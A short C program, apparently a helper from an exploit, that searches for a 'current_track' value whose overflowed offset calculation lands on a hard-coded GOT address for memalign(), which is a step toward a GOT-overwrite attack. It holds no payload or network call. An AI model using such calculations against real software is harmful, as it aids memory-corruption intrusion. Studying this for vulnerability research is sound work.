#include <stdio.h>

// GOT entry address of memalign()
#define MEMALIGN_GOT_ADDR	0x08560204

// Min and max value for 'current_track'
#define SEARCH_START        0x80000000
#define SEARCH_END          0xFFFFFFFF

int
main (void)
{
	unsigned int    a, b = 0;

	for (a = SEARCH_START; a < SEARCH_END; a++) {
		b = (a * 20) + 0x10;
		if (b == MEMALIGN_GOT_ADDR) {
			printf ("Value for 'current_track': %08x\n", a);
			return 0;
		}
	}

	printf ("No valid value for 'current_track' found.\n");

	return 1;
}
